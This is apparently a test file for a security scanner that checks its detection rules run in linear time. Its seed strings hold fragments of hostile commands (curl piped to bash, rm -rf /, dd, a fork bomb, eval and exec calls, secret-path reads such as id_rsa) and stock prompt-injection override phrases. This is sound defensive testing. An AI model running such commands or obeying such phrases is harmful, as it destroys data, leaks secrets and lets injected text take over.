"""FR-E5 t4: every rule, every scan-surface regex and every scan loop runs in linear time.

SEEDS is hand-written and keyed by what it scans: each rule id, each compiled regex in the
scan surfaces ('regex:<surface>.<name>'), each surface's extract() ('surface:<name>') and
the hidden-Unicode check ('unicode'). A key's seeds are its literal prefixes and runs of
the characters its windows take; each seed is repeated with no terminator, so a window
that could be rescanned from many starts would be. The test fails when anything it should
scan has no entry, and when an entry names nothing.

- Budget: each rule in CODE_RULES, TEXT_RULES and PROSE_RULES and each surface regex scans 1 MiB of each
  of its seeds (and of CLASS_RUNS) within BUDGET_S of CPU time. The worst cases measured
  are in the FR-E5 notes; the unbounded rce.shell_true gap, for one, took 1.4 s on 64 KiB.
- Linearity: the agent-instruction rule and the Python loops (each surface's extract(),
  hidden_unicode) take longer per byte. For them, scanning 4x the text must take less than
  MAX_RATIO times as long: about 4 for a linear scan, 16 for a quadratic one.

Payloads are assembled at runtime. Run: PYTHONPATH=src python3 -B -m unittest discover -s tests
"""
from __future__ import annotations

import re
import time
import unittest
from pathlib import Path
from types import ModuleType
from typing import Callable

from frisk import redact, rules, surfaces
from frisk.rules import PerCommand, hidden_unicode

SIZE = 1 << 20
BUDGET_S = 1.0
# The linearity check: SMALL then 4 * SMALL characters, best of RUNS each.
SMALL, RUNS, MAX_RATIO = 32 * 1024, 2, 10.0

RM, CURL, EVAL, EXEC = "r" + "m", "cu" + "rl", "ev" + "al", "ex" + "ec"
ZWJ, TAG, FLAG = chr(0x200D), chr(0xE0067), chr(0x1F3F4)

SEEDS: dict[str, tuple[str, ...]] = {
    "rce.pipe_installer": (CURL + " ", CURL + " |", CURL + " x | ", CURL + " x | sudo -a ", CURL + " x | a/",
                           CURL + " \\\n", "ba" + "sh <(", "sh -c ", "wg" + "et x |" + "/" * 30, "| "),
    "rce.eval_b64": (EVAL + "(", EXEC + "(", EVAL + "( b", EVAL + "(base64", EVAL + "(b64.", EVAL + "(" + "x" * 395,
                     EVAL + "(" + " " * 300, EXEC + "(" + "\n" * 300,
                     EVAL + "(\n", "b64", "e"),
    "rce.python_exec": (EXEC + " ", "os.sys" + "tem ", EVAL + "  ", "os.", "e"),
    "rce.shell_true": ("subprocess.run(", "subprocess.run(" + "x" * 385, "subprocess.Popen( shell",
                       "subprocess.run(shell = ", "shell=", "s", "subprocess.run(\n"),
    "rce.shell_eval": (";", "; ", ";" + EVAL + " ", "| " + EVAL + "  ", EVAL + " "),
    "rce.pickle": ("pickle.load ", "pickle.", "marshal.loads "),
    "rce.dynamic_import": ("__import__ ", "importlib.", "importlib.import_module "),
    "exfil.secret_paths": ("~/.", "$HOME/.", "/.", ".ss", "id_rs"),
    "exfil.secret_paths_prose": ("~/.", "$HOME/.", "/.", ".ss", "id_rs"),
    "exfil.dotenv": (".env", ".en", "."),
    "exfil.secret_env_read": ("$", "${", "os.environ", "getenv ", "$" + "x" * 29, "$t", "$tokex", "ENV[t",
                              "getenv" + "t" * 24, "process.env "),
    "exfil.secret_name": ("A", "AB_", "AAAAAAAAAA TOKE", "A_TOKE"),
    "exfil.keychain_read": ("security ", "security find-"),
    "exfil.keychain_mention": ("security ", "keychai", "security list-"),
    "exfil.net_lib": ("requests", "urllib", "http."),
    "exfil.net_tool": (";nc", " nc", "|rsync", " "),
    "destroy.rm_rf": (RM + " ", RM + " -", RM + " -r ", RM + " -rf ", RM + " -f -r a ", "-r ", (RM + " ") * 32 + "-rf ",
                      RM + " -rf /x ", RM + " -rf ~x ", RM + ' -rf "', RM + " -rf /usr/", RM + " ;", RM + "\n",
                      RM + " -" + "a" * 40 + " ", RM + " -" + "r" * 4096 + " ", "a "),
    "destroy.disk": ("d" + "d ", "d" + "d of=", "mk" + "fs ", "mk" + "fs.x ", "> /dev/", "d" + "d if=x "),
    "destroy.forkbomb": (":()", ":() { :|:& }"),
    "destroy.chmod_777": ("chmod ", "chmod -R "),
    "inject.ignore_prev": ("ignore ", "ignore all ", "ignore the previous "),
    "inject.disregard": ("disregard ", "disregard all "),
    "inject.fake_tool": ("<", "< "),
    "inject.role_override": ("<|im_start|>", "<|im_start|> "),
    "inject.exfil_instr": ("send ", "send to ", "sent to x\n", "post to ", "to ", "post" + " to" * 13 + " ",
                           "post " + "x" * 36, "to " + "x" * 38, "post to http", "post to :", "to http:", "sent\nto ",
                           "posts to x:"),
    "inject.hide_from_user": ("do not tell ", "do not ", "do not tell the "),
    "inject.hidden_important": ("<", "< important"),
    "inject.before_using": ("before using ", "before you use ", "before using this "),
    "inject.read_then_send": ("read ", "cat ", "read to ", "cat " + "x" * 36, "cat .", "open .ss", "read id_rs"),
    "inject.sensitive_path_instruction": ("copy ", ".copy", "copy never ", "cat ."),
    "regex:build_recipes._MAKE": ("\tx\\\n", "a:b;", "a:", "x\\\n", "\t", "a:" * 20 + "\n"),
    "regex:build_recipes._DOCKER": ("RUN x\\\n", "RUN ", "\\\n", "RUN \\"),
    "regex:build_recipes._JUST": (" x\\\n", " ", "\\\n", " \\"),
    "regex:fences._OPEN": ("```\n", "x ```", "`", " ```x\n", "``` ```\n", "~~~\n", "x`", "\t"),
    "regex:markdown._COMMENT": ("<!--", "<!-", "<", "-->"),
    "regex:markdown._LINE": ("x", "\n"),
    "regex:markdown._LIST_ITEM": ("* x\n", "1. ", "123456789."),
    "regex:markdown._BLANK_LINE": ("\n", "\n \t", " "),
    "regex:markdown._TICKS": ("`", "` "),
    "surface:build_recipes": ("\tx\\\n", "RUN x\\\n", " x\\\n", "a:b;"),
    "surface:fences": ("```\n", "```x\n", "~~~\n", "x ```"),
    "surface:instructions": ("x",),
    # FR-E3b item 4: each seed is an element of a JSON array (see JSON_ARRAY), so the file parses.
    "surface:json_values": ('"a", ', '"a|b", ', '"\\u200b", ', '"\\"x\\"", ', '{"command": "x", "args": ["-c", "y"]}, ',
                            '{"args": ["-c"]}, ', '{"run": ["a", "b"]}, ', '["a"], ', '{"\\u0061": "b"}, ',
                            '"' + "\\\\" * 20 + '", ', '"' + " |" * 20 + '", '),
    "regex:json_values._PIPE": ("a|", "a |", "a| ", "|", "||", " | ", "a" + " " * 40),
    "surface:markdown": ("`", "` `", "<!--", "    x\n", "\n\n    x\n", "* x\n", "```\n", "1. x\n"),
    "surface:package_json": ('"a": "b", ', '"\\"": "\\\\", '),
    "surface:plain": ("x",),
    "unicode": (ZWJ, chr(0x1F600) + ZWJ, TAG, FLAG + TAG * 5 + chr(0xE007F), chr(0xE0100), chr(0xFEFF),
                "a" + chr(0xAD)),
    # FR-E6 F3.06: the excerpt redactor, over a whole text (engine runs it once per file with a finding).
    "redact": ("password", "password ", 'key"', "passwd:", "token =>", "://a", "://" + "u" * 40, "-----BEGIN ",
               "-----BEGIN " + "RSA PRIVATE KEY-----", "-----BEGIN " + " " * 40, "AK" + "IA",
               "AK" + "IA" + "Z" * 15 + " ",
               "Ab3" * 10 + "x ", "a1", "0123456789abcdef", "bearer ", "s" + "k-", "gh" + "p_", "key" + "y" * 64),
}
# Runs of one character class, given to every budgeted key as well.
CLASS_RUNS = (" ", "a", "\n", "/", "-", "$", "(")
# The file names each surface's extract() reads its text as. A package.json seed is
# repeated inside a scripts object, so the file parses.
SURFACE_FILES = {"fences": ("notes.txt",), "markdown": ("README.md",), "plain": ("x.py",),
                 "build_recipes": ("Makefile", "Dockerfile", "justfile"), "instructions": ("SKILL.md",),
                 "package_json": ("package.json",), "json_values": ("x.json",)}
PACKAGE_JSON = ('{"scripts": {', '"z": "y"}}')
JSON_ARRAY = ("[", '"z"]')


def repeat(seed: str, size: int) -> str:
    """Whole copies of `seed`, about `size` characters of them."""
    return seed * max(1, size // len(seed))


def cpu_seconds(scan: Callable[[str], object], text: str) -> float:
    t0 = time.process_time()
    scan(text)
    return time.process_time() - t0


def finditer_scan(pattern: re.Pattern[str] | PerCommand) -> Callable[[str], object]:
    def scan(text: str) -> int:
        return sum(1 for _ in pattern.finditer(text))
    return scan


def extract_scan(surface: ModuleType) -> Callable[[str], object]:
    def scan(text: str) -> None:
        for name in SURFACE_FILES[surfaces.name_of(surface)]:
            wrap = {"package.json": PACKAGE_JSON, "x.json": JSON_ARRAY}.get(name, ("", ""))
            body = wrap[0] + text + wrap[1]
            surface.extract(Path(name), body)
    return scan


def budgeted() -> dict[str, Callable[[str], object]]:
    """Held to BUDGET_S on 1 MiB: the rules of CODE_RULES and TEXT_RULES, and the regexes the
    surfaces run over a whole file. package_json's, and json_values' _TOKEN, run only on text
    json.loads accepted (one match per string literal) or between two literals, so their
    extract() covers them."""
    out = {rid: finditer_scan(rx) for rid, _cat, _sev, rx, _desc, _ctx in
           rules.CODE_RULES + rules.TEXT_RULES + rules.PROSE_RULES}
    for surface in surfaces.load():
        if surfaces.name_of(surface) == "package_json":
            continue
        for name, value in vars(surface).items():
            if isinstance(value, re.Pattern) and (surfaces.name_of(surface), name) != ("json_values", "_TOKEN"):
                out[f"regex:{surfaces.name_of(surface)}.{name}"] = finditer_scan(value)
    return out


def linear() -> dict[str, Callable[[str], object]]:
    """Held to linear growth: the instruction rules, each surface's extract(), hidden_unicode."""
    out = {rid: finditer_scan(rx) for rid, _cat, _sev, rx, _desc, _ctx in rules.INSTRUCTION_RULES}
    out.update({f"surface:{surfaces.name_of(s)}": extract_scan(s) for s in surfaces.load()})
    out["unicode"] = hidden_unicode
    out["redact"] = redact.secret_spans
    return out


class TestEveryScanIsCovered(unittest.TestCase):
    def test_every_rule_surface_regex_and_scan_loop_has_seeds(self) -> None:
        keys = set(budgeted()) | set(linear())
        self.assertEqual(sorted(keys - set(SEEDS)), [])
        self.assertEqual(sorted(set(SEEDS) - keys), [])
        self.assertEqual([key for key, seeds in SEEDS.items() if not seeds], [])


class TestLinearTime(unittest.TestCase):
    def test_each_rule_and_surface_regex_scans_1_mib_within_the_budget(self) -> None:
        for key, scan in sorted(budgeted().items()):
            for seed in SEEDS[key] + CLASS_RUNS:
                with self.subTest(key=key, seed=seed[:24]):
                    # A sixteenth first: a quadratic scan fails here in seconds, not after minutes.
                    self.assertLess(cpu_seconds(scan, repeat(seed, SIZE // 16)), BUDGET_S / 4)
                    text = repeat(seed, SIZE)
                    spent = cpu_seconds(scan, text)
                    if spent > BUDGET_S:  # one more try, so a moment of machine load does not fail it
                        spent = min(spent, cpu_seconds(scan, text))
                    self.assertLessEqual(spent, BUDGET_S)

    def test_the_instruction_rule_and_the_scan_loops_grow_linearly(self) -> None:
        for key, scan in sorted(linear().items()):
            for seed in SEEDS[key]:
                with self.subTest(key=key, seed=seed[:24]):
                    small, large = repeat(seed, SMALL), repeat(seed, 4 * SMALL)
                    t_small = min(cpu_seconds(scan, small) for _ in range(RUNS))
                    t_large = min(cpu_seconds(scan, large) for _ in range(RUNS))
                    self.assertLess(t_large, MAX_RATIO * max(t_small, 0.002))


class TestBoundsKeepDetection(unittest.TestCase):
    """The bounded windows still catch what they are for."""

    def rule(self, rid: str) -> re.Pattern[str] | PerCommand:
        (pattern,) = [r[3] for r in rules.CODE_RULES + rules.TEXT_RULES if r[0] == rid]
        return pattern

    def test_a_pipe_to_shell_with_a_300_character_url_is_caught(self) -> None:
        url = "https://" + "a" * 280 + ".example.invalid/i.sh"
        self.assertEqual(len(url), 309)
        self.assertIsNotNone(self.rule("rce.pipe_installer").search(CURL + " -sL " + url + " | b" + "ash"))

    def test_a_long_call_is_caught_within_400_characters(self) -> None:
        args = "[" + ", ".join(['"x"'] * 76) + "]"  # 382 characters before the keyword
        self.assertIsNotNone(self.rule("rce.shell_true").search("subprocess.run(" + args + ", shell=True)"))
        self.assertIsNotNone(self.rule("rce.eval_b64").search(EVAL + "(" + args + " + base64.b64decode(p))"))
        far = "[" + ", ".join(['"x"'] * 90) + "]"  # 452 characters: past the bound
        self.assertIsNone(self.rule("rce.shell_true").search("subprocess.run(" + far + ", shell=True)"))

    def test_a_later_start_matches_when_a_window_stops_at_it(self) -> None:
        nested = "subprocess.run(x if subprocess.call(y, shell=True) else z"
        self.assertEqual(self.rule("rce.shell_true").search(nested).start(), nested.index("subprocess.call"))
        env = "os.environ.get('$GITHUB_" + "TOKEN')"
        self.assertEqual(self.rule("exfil.secret_env_read").search(env).start(), env.index("$"))

    def test_rm_rf_reads_one_command_once_and_further_than_32_words(self) -> None:
        rm = self.rule("destroy.rm_rf")
        command = RM + " -rf " + "build/x " * 100 + "/"
        self.assertEqual([m.start() for m in rm.finditer(command)], [0])  # main: 32 words, missed
        many = RM + " a " + RM + " b " + RM + " -rf /"
        self.assertEqual([m.start() for m in rm.finditer(many)], [0])  # one finding per command
        self.assertEqual([m.start() for m in rm.finditer(many + "; " + many)], [0, len(many) + 2])
        self.assertIsNone(rm.search(RM + " -rf " + "x " * 260 + "/"))  # past the 256-word window
        self.assertIsNone(rm.search(RM + " -rf /tmp/x " + RM + " ./build"))


if __name__ == "__main__":
    unittest.main()
